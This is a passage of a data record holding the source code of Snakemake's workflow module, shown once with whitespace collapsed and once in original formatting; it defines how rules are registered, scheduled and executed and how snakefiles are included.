WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def 